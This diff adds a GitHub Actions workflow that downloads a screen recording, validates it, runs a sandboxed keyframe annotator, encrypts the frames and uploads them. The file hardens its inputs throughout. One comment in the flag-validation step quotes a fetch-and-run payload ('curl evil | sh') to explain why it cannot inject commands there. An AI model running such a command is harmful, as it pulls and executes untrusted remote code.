@@ -1,0 +1,435 @@
+name: Annotate video
+
+run-name: >-
+  annotate ${{ inputs.drive_file_id || github.event.client_payload.drive_file_id
+            || inputs.video_url || github.event.client_payload.video_url }}
+
+# Stage 1 of the video pipeline: extracts timestamped keyframes and change
+# regions from a screen recording of a manual test journey, and publishes them
+# as an artifact.
+#
+# Stage 2 (plan → generate → run → heal) is deliberately NOT here. It needs
+# Claude reading the frames, a live app for the generator to resolve real
+# locators against, and a human confirmation gate that exists to catch a misread
+# frame before it becomes a wrong assertion. Only stage 1 is deterministic and
+# unattended — which is exactly why the pipeline is two skills, not one.
+# See docs/AI-INTEGRATION.md.
+#
+# ── Runs on ubuntu-latest, not the self-hosted box ──────────────────────────
+# The annotator is packaged as a container (tools/video-annotator/Dockerfile,
+# published by annotator-image.yml). It is pure Python + OpenCV with no Windows
+# dependency, so a stock GitHub runner is enough: nothing to provision, no venv
+# to keep in sync, and no contention with the e2e-local workflow for this
+# machine's ports and database.
+#
+# ── Input format ────────────────────────────────────────────────────────────
+# The recording must be MP4 (H.264). OpenCV is unreliable with the VP8/VP9 .webm
+# that many browser-based recorders emit. The guard below checks the file header
+# rather than the extension, because a .webm renamed to .mp4 passes an extension
+# check and then dies inside OpenCV with an unhelpful stack trace.
+#
+# ── Two ways in ─────────────────────────────────────────────────────────────
+# `video_url` for any directly-downloadable URL, or `drive_file_id` for a file
+# in the watched Google Drive folder. A Drive *share link* pasted into
+# `video_url` is detected and converted — on its own it is an HTML page, not a
+# video, and would otherwise be saved as recording.mp4 and rejected by the guard
+# with a completely misleading "transcode it properly" error.
+
+on:
+  workflow_dispatch:
+    inputs:
+      video_url:
+        description: 'Direct download URL for the .mp4 (or a Google Drive share link)'
+        required: false
+        type: string
+      drive_file_id:
+        description: 'Google Drive file id, if the recording is in the watched folder'
+        required: false
+        type: string
+      extra_args:
+        description: 'Optional annotator flags, e.g. --scene-threshold 0.004 --max-frames 90'
+        required: false
+        type: string
+  # Wired for drive-watch.yml, which sends one dispatch per new recording with
+  # `drive_file_id` in the payload. Deliberately carries no credential: the
+  # payload is retained in the event record and any step in any workflow could
+  # print it into a public log. This job mints its own token instead.
+  repository_dispatch:
+    types:
+      - annotate-video
+
+concurrency:
+  # Must include drive_file_id. Keying only on video_url collapses every
+  # Drive-mode run into the group "annotate-video-" and, with
+  # cancel-in-progress:false, serialises them one at a time.
+  group: >-
+    annotate-video-${{ inputs.video_url || github.event.client_payload.video_url
+                    || inputs.drive_file_id || github.event.client_payload.drive_file_id }}
+  cancel-in-progress: false
+
+env:
+  IMAGE: ghcr.io/${{ github.repository }}/video-annotator:latest
+  VIDEO_URL: ${{ inputs.video_url || github.event.client_payload.video_url }}
+  DRIVE_FILE_ID: ${{ inputs.drive_file_id || github.event.client_payload.drive_file_id }}
+  EXTRA_ARGS: ${{ inputs.extra_args || github.event.client_payload.extra_args }}
+
+jobs:
+  annotate:
+    name: Annotate screen recording
+    runs-on: ubuntu-latest
+    timeout-minutes: 20
+    permissions:
+      contents: read
+      packages: read
+
+    # Hoisted to job level because the `secrets` context is NOT available in a
+    # step-level `if:` — only github/env/vars/steps/job/runner/inputs/needs are.
+    # Referencing secrets.* there evaluates to empty and the guard silently
+    # stops working. `env.` is allowed, so read it through here instead.
+    env:
+      SEND_SLACK: ${{ vars.SEND_SLACK || 'no' }}
+      SLACK_WEBHOOK_URL: ${{ secrets.SLACK_WEBHOOK_URL }}
+      HAS_GDRIVE_KEY: ${{ secrets.GDRIVE_SA_KEY != '' && 'yes' || 'no' }}
+
+    steps:
+      - name: Log in to GHCR
+        uses: docker/login-action@v3
+        with:
+          registry: ghcr.io
+          username: ${{ github.actor }}
+          password: ${{ secrets.GITHUB_TOKEN }}
+
+      # Validate the annotator flags before anything expensive runs.
+      #
+      # $EXTRA_ARGS is NOT a shell-injection vector — bash does not re-parse the
+      # result of a parameter expansion for `;`, `&&`, backticks or $(). A payload
+      # like "; curl evil | sh" reaches argparse as literal argv and dies there.
+      # The real risks are glob expansion (handled with `set -f` at the run step)
+      # and resource abuse: `--max-frames 100000 --keep-raw` produces a multi-GB
+      # artifact and a 20-minute timeout. Hence an allowlist and a cap.
+      #
+      # --input and --output-dir are deliberately absent from the allowlist.
+      - name: 'Guard: validate extra_args'
+        if: env.EXTRA_ARGS != ''
+        run: |
+          set -euo pipefail
+          # Value-taking flags REQUIRE their value — the numeric group is not
+          # optional. Bare `--max-frames` would otherwise pass here and then fail
+          # deep inside argparse, and it would leave N empty below, where
+          # `[ "$N" -gt 300 ]` dies with "integer expression expected".
+          VALUED='--(scene-threshold|pixel-delta|min-gap-ms|max-gap-ms|settle-ms|max-frames|cursor-threshold) [0-9]+(\.[0-9]+)?'
+          BARE='--(cursor|keep-raw)'
+          FLAG="$VALUED|$BARE"
+          if ! printf '%s' "$EXTRA_ARGS" | grep -qE "^($FLAG)( ($FLAG))*$"; then
+            echo "::error::extra_args rejected. Allowed flags only, and every flag that takes a value must be given one — see tools/video-annotator/annotate_video.py lines 63-91."
+            exit 1
+          fi
+          case " $EXTRA_ARGS " in
+            *" --max-frames "*)
+              N=$(printf '%s' "$EXTRA_ARGS" | sed -nE 's/.*--max-frames ([0-9]+).*/\1/p')
+              if [ -z "$N" ] || [ "$N" -gt 300 ]; then
+                echo "::error::--max-frames must be an integer of 300 or less here (artifact size and the 20-minute job timeout)."
+                exit 1
+              fi ;;
+          esac
+          echo "extra_args accepted: $EXTRA_ARGS"
+
+      # Computed in a step rather than inline so later steps can branch on it:
+      # `steps.*` IS available in a step-level `if:`, unlike `secrets.*`.
+      - name: Resolve source
+        id: src
+        run: |
+          set -euo pipefail
+          id="${DRIVE_FILE_ID:-}"
+          url="${VIDEO_URL:-}"
+
+          # A Drive share link (drive.google.com/file/d/<id>/view) is an HTML
+          # page. Left as a plain URL, curl saves that HTML as the video and the
+          # ftyp guard then reports "transcode it properly" — true, and useless.
+          if [ -z "$id" ] && [ -n "$url" ]; then
+            case "$url" in
+              *drive.google.com*|*docs.google.com*)
+                id=$(printf '%s' "$url" | sed -nE \
+                  -e 's#.*/file/d/([A-Za-z0-9_-]{10,}).*#\1#p' \
+                  -e 's#.*[?&]id=([A-Za-z0-9_-]{10,}).*#\1#p' | head -1)
+                if [ -z "$id" ]; then
+                  echo "::error::That looks like a Google Drive link but no file id could be extracted from it. Pass drive_file_id instead."
+                  exit 1
+                fi
+                echo "::notice::Detected a Drive share link; using the Drive API with file id ${id}"
+                ;;
+            esac
+          fi
+
+          if [ -n "$id" ]; then
+            # Whitelist before the id reaches a URL or a filename.
+            if ! printf '%s' "$id" | grep -qE '^[A-Za-z0-9_-]{10,120}$'; then
+              echo "::error::drive_file_id is not a valid Drive file id."
+              exit 1
+            fi
+            if [ "$HAS_GDRIVE_KEY" != yes ]; then
+              echo "::error::A Drive source was requested but secret GDRIVE_SA_KEY is not set. See docs/AI-INTEGRATION.md for the one-time setup."
+              exit 1
+            fi
+            { echo "mode=drive"; echo "file_id=$id"; } >> "$GITHUB_OUTPUT"
+          elif [ -n "$url" ]; then
+            echo "mode=url" >> "$GITHUB_OUTPUT"
+          else
+            echo "::error::Provide either video_url or drive_file_id."
+            exit 1
+          fi
+
+      # create_credentials_file:false — the default writes the raw service-account
+      # key JSON into $GITHUB_WORKSPACE as gha-creds-*.json. This repo is public
+      # and this job runs upload-artifact in the same workspace, so that file is
+      # one careless `path: .` away from being published. We only need the token.
+      #
+      # access_token_scopes is REQUIRED: the action's default scope is
+      # cloud-platform, and a token without the Drive scope 403s on every call
+      # with insufficientScopes.
+      #
+      # TODO: pin to a commit SHA rather than a moving tag — this is a
+      # third-party action handling a credential. Get the SHA with:
+      #   gh api repos/google-github-actions/auth/git/ref/tags/v2 --jq .object.sha
+      - name: Authenticate to Google Drive
+        id: gauth
+        if: steps.src.outputs.mode == 'drive'
+        uses: google-github-actions/auth@v2
+        with:
+          credentials_json: ${{ secrets.GDRIVE_SA_KEY }}
+          token_format: access_token
+          access_token_scopes: https://www.googleapis.com/auth/drive.readonly
+          create_credentials_file: false
+          export_environment_variables: false
+
+      - name: Download the recording
+        id: dl
+        env:
+          MODE: ${{ steps.src.outputs.mode }}
+          FILE_ID: ${{ steps.src.outputs.file_id }}
+          # Via env:, never inline. The auth action registers the token with
+          # core.setSecret so it is masked in logs — but masking is exact string
+          # matching, so it does not survive base64, url-escaping or being split
+          # across a line. Never put it in a URL and never enable `set -x`.
+          DRIVE_TOKEN: ${{ steps.gauth.outputs.access_token }}
+        run: |
+          set -euo pipefail
+          mkdir -p in out
+
+          # Order matters. Control characters go first: Drive permits newlines in
+          # a file name, and a newline written to $GITHUB_OUTPUT is arbitrary
+          # variable injection. Then strip any path component, then whitelist —
+          # which also removes every shell metacharacter and glob character. Then
+          # strip leading dots and dashes so the result can never be read as an
+          # option by argparse, nor be "." or "..".
+          sanitise() {
+            printf '%s' "$1" \
+              | tr -d '\000-\037\177' \
+              | sed -e 's#.*[/\\]##' \
+                    -e 's#\.[A-Za-z0-9]\{1,5\}$##' \
+                    -e 's#[^A-Za-z0-9._-]#_#g' \
+                    -e 's#_\{2,\}#_#g' \
+                    -e 's#^[._-]*##' -e 's#[._-]*$##' \
+              | cut -c1-80
+          }
+
+          if [ "$MODE" = drive ]; then
+            # The authoritative name comes from Drive, which is what stops every
+            # artifact being called "annotations-recording": the slug downstream
+            # derives from the filename the annotator sees.
+            # supportsAllDrives is required for items on a Shared Drive.
+            curl -sS --fail-with-body -o "$RUNNER_TEMP/meta.json" \
+              -H "Authorization: Bearer $DRIVE_TOKEN" \
+              "https://www.googleapis.com/drive/v3/files/${FILE_ID}?supportsAllDrives=true&fields=name,size,mimeType"
+
+            STEM=$(sanitise "$(jq -r '.name' "$RUNNER_TEMP/meta.json")")
+            [ -n "$STEM" ] || STEM="drive-$(printf '%s' "$FILE_ID" | cut -c1-12)"
+            TARGET="in/${STEM}.mp4"
+
+            # alt=media streams the bytes. NOT drive.google.com/uc?export=download,
+            # which serves a virus-scan interstitial for larger files and needs
+            # confirm-token scraping. No -L: curl drops the Authorization header
+            # across a host change by design, so a followed redirect would 401
+            # confusingly instead of failing here.
+            curl -sS --fail-with-body --remove-on-error \
+              --retry 3 --retry-delay 5 --retry-all-errors --max-time 900 \
+              -o "$TARGET" \
+              -H "Authorization: Bearer $DRIVE_TOKEN" \
+              "https://www.googleapis.com/drive/v3/files/${FILE_ID}?alt=media&supportsAllDrives=true"
+          else
+            STEM=$(sanitise "$(printf '%s' "${VIDEO_URL%%\?*}" | sed 's#.*/##')")
+            [ -n "$STEM" ] || STEM="recording"
+            TARGET="in/${STEM}.mp4"
+            curl -sS --fail-with-body --remove-on-error \
+              --retry 3 --retry-delay 5 --retry-all-errors --max-time 900 \
+              -o "$TARGET" "$VIDEO_URL"
+          fi
+
+          # Size only. Run logs on a public repo are world-readable, and a Drive
+          # file name often carries a customer or ticket identifier.
+          echo "downloaded $(stat -c %s "$TARGET") bytes"
+          { echo "target=$TARGET"; echo "stem=$STEM"; } >> "$GITHUB_OUTPUT"
+
+      # Three distinct failures used to share one misleading message. Split so the
+      # error names the actual cause.
+      #
+      # Honest limitation: QuickTime .mov also carries an ftyp box, so this proves
+      # "ISO base media family", not "MP4". H.264-in-MOV decodes fine, so that is
+      # acceptable — the poller's mimeType allowlist is what really bounds input.
+      - name: 'Guard: must be a decodable MP4'
+        env:
+          TARGET: ${{ steps.dl.outputs.target }}
+        run: |
+          set -euo pipefail
+          SZ=$(stat -c %s "$TARGET")
+          if [ "$SZ" -lt 10240 ]; then
+            echo "::error::Download is only ${SZ} bytes — the source returned an error page or an empty file, not a video."
+            exit 1
+          fi
+          head -c 12 "$TARGET" > "$RUNNER_TEMP/hdr"
+          if grep -qa '^[[:space:]]*[{[]' "$RUNNER_TEMP/hdr"; then
+            echo "::error::Got a JSON body instead of video bytes — an API error was saved to disk."
+            exit 1
+          fi
+          if grep -qai '<!doctype\|<html' "$RUNNER_TEMP/hdr"; then
+            echo "::error::Got an HTML page instead of video bytes. A Drive share link is not a download URL — pass drive_file_id."
+            exit 1
+          fi
+          # Bytes 4..8 of MP4/MOV are the 'ftyp' box; Matroska/webm starts 0x1A45DFA3.
+          if ! grep -qa 'ftyp' "$RUNNER_TEMP/hdr"; then
+            echo "::error::Not an MP4/MOV container (no ftyp box). A .webm renamed to .mp4 will fail in OpenCV — transcode it: ffmpeg -i in.webm -c:v libx264 -pix_fmt yuv420p out.mp4"
+            exit 1
+          fi
+
+      # --user keeps the bind-mounted output owned by the runner user rather than
+      # the container's uid, so the upload step can read it.
+      #
+      # The rest is because the input is now an untrusted file from a shared Drive
+      # folder being fed to OpenCV's native decoders — a large parsing surface.
+      # The annotator needs no network and no capabilities.
+      - name: Run the annotator
+        env:
+          TARGET: ${{ steps.dl.outputs.target }}
+        run: |
+          set -euo pipefail
+          # `set -f` disables globbing before word-splitting $EXTRA_ARGS, so an
+          # argument containing * cannot expand against the workspace.
+          set -f
+          read -ra ARGS <<< "${EXTRA_ARGS:-}"
+          set +f
+          docker run --rm \
+            --user "$(id -u):$(id -g)" \
+            --network none \
+            --cap-drop ALL \
+            --security-opt no-new-privileges \
+            --memory 4g \
+            --pids-limit 256 \
+            -v "$PWD/in:/in:ro" \
+            -v "$PWD/out:/out" \
+            "$IMAGE" \
+            --input "/in/$(basename "$TARGET")" \
+            --output-dir /out \
+            "${ARGS[@]}"
+
+      # Surface the numbers in the run summary so a reviewer can judge the
+      # result without downloading the artifact.
+      - name: Summarise
+        id: summary
+        run: |
+          node -e '
+            const fs = require("fs");
+            const d = JSON.parse(fs.readFileSync("out/annotations.json", "utf8"));
+            const gapS = d.max_action_gap_ms / 1000;
+            const limitS = d.settings.max_gap_ms / 1000;
+            const covered = d.max_action_gap_ms <= d.settings.max_gap_ms;
+            // duration_ms is nullable in the schema (annotate_video.py writes null
+            // when the container reports no frame count), so guard it — otherwise
+            // the table reads "0.0 s" and the long-video warning silently never fires.
+            const durMs = typeof d.duration_ms === "number" ? d.duration_ms : null;
+            const durTxt = durMs === null ? "unknown" : (durMs / 1000).toFixed(1) + " s";
+            let md = "## Annotation result\n\n| | |\n|---|---|\n";
+            for (const [k, v] of [
+              ["Video", d.video],
+              ["Resolution", d.frame_size.join(" x ")],
+              ["Duration", durTxt],
+              ["Keyframes", `${d.keyframe_count} (${d.action_count} action, ${d.forced_count} force-sampled)`],
+              ["Max action gap", `${gapS.toFixed(1)} s of ${limitS.toFixed(1)} s allowed`],
+              ["Truncated", String(d.truncated)],
+            ]) md += `| **${k}** | ${v} |\n`;
+            if (!covered) md += "\n> **Coverage gap** — an interval exceeded `--max-gap-ms`, so a step of the journey may be unsampled. Lower `--max-gap-ms` and re-run.\n";
+            if (d.truncated) md += "\n> **Change points were capped** — raise `--max-frames` if steps look missing.\n";
+            if (durMs === null) md += "\n> **Duration unknown** — the container reported no frame count, so per-keyframe timestamps may be wrong. Check the recording.\n";
+            if (d.action_count < 10 && durMs !== null && durMs > 60000) md += "\n> **Few action keyframes for a long video** — consider `--scene-threshold 0.004`.\n";
+            fs.appendFileSync(process.env.GITHUB_STEP_SUMMARY, md);
+            fs.appendFileSync(process.env.GITHUB_OUTPUT,
+              `keyframes=${d.keyframe_count}\naction=${d.action_count}\ngap=${gapS.toFixed(1)}\ncovered=${covered}\nslug=${d.video.replace(/\.[^.]+$/, "").toLowerCase().replace(/[^a-z0-9]+/g, "-").replace(/^-|-$/g, "")}\n`);
+          '
+
+      # ── Why the frames are encrypted ────────────────────────────────────────
+      # This repository is public, and workflow artifacts on a public repo are
+      # downloadable by anyone. There is no setting that changes that. The keyframes
+      # are screenshots of the live application with real user records in them, so
+      # they do not go out in the clear.
+      #
+      # annotations.json is published unencrypted on purpose: it holds only
+      # timestamps, change-region rectangles and the settings block — no pixels —
+      # and it is what the run summary above reports on, so a reviewer can judge the
+      # result without decrypting anything.
+      #
+      # A missing passphrase FAILS the run rather than falling back to plaintext.
+      # A failed run is recoverable; a published frame is not.
+      - name: Encrypt frames
+        env:
+          PASSPHRASE: ${{ secrets.ANNOTATION_ARCHIVE_PASSPHRASE }}
+        run: |
+          set -euo pipefail
+          if [ -z "${PASSPHRASE:-}" ]; then
+            echo "::error::Secret ANNOTATION_ARCHIVE_PASSPHRASE is not set. The keyframes show the live application and this repo is public, so they are never published unencrypted. Add the secret, then re-run."
+            exit 1
+          fi
+          # --passphrase-fd 3 with a herestring keeps the secret out of argv (which is
+          # world-readable via /proc) and out of any command trace. --batch --yes
+          # because there is no tty to prompt on.
+          tar -C out -czf - frames \
+            | gpg --batch --yes --symmetric --cipher-algo AES256 \
+                  --passphrase-fd 3 -o out/frames.tar.gz.gpg 3<<<"$PASSPHRASE"
+          rm -rf out/frames
+          echo "Encrypted archive replaces the plaintext frames:"
+          ls -lh out
+
+      - name: Upload annotations
+        uses: actions/upload-artifact@v4
+        with:
+          name: annotations-${{ steps.summary.outputs.slug }}
+          path: out
+          retention-days: 30
+
+      - name: Notify Slack
+        if: always() && env.SEND_SLACK == 'yes' && env.SLACK_WEBHOOK_URL != ''
+        run: |
+          RUN_URL="${GITHUB_SERVER_URL}/${GITHUB_REPOSITORY}/actions/runs/${GITHUB_RUN_ID}"
+          if [ "${{ job.status }}" = "success" ]; then
+            TEXT=":movie_camera: Annotated *${{ steps.summary.outputs.slug }}* — ${{ steps.summary.outputs.keyframes }} keyframes (${{ steps.summary.outputs.action }} action), max gap ${{ steps.summary.outputs.gap }}s. Artifact: ${RUN_URL}"
+          else
+            TEXT=":x: Video annotation failed — ${RUN_URL}"
+          fi
+          curl -fsS -X POST -H 'Content-Type: application/json' \
+            -d "$(node -e 'console.log(JSON.stringify({text: process.argv[1]}))' "$TEXT")" \
+            "$SLACK_WEBHOOK_URL"
+
+      - name: Next step
+        if: success()
+        run: |
+          {
+            echo ""
+            echo "### Next"
+            echo "Download the \`annotations-${{ steps.summary.outputs.slug }}\` artifact and extract it. The keyframes ship encrypted, because artifacts on a public repo are downloadable by anyone — decrypt them in place first:"
+            echo '```'
+            echo 'gpg -d frames.tar.gz.gpg | tar xz'
+            echo '```'
+            echo "That restores \`frames/\` next to \`annotations.json\`. Stage 2 needs both. Then, locally:"
+            echo '```'
+            echo '/annotations-to-script "<path to the extracted folder>"'
+            echo '```'
+            echo "Stage 2 needs Claude, a live app and a human confirmation gate, so it is not run in CI."
+          } >> "$GITHUB_STEP_SUMMARY"
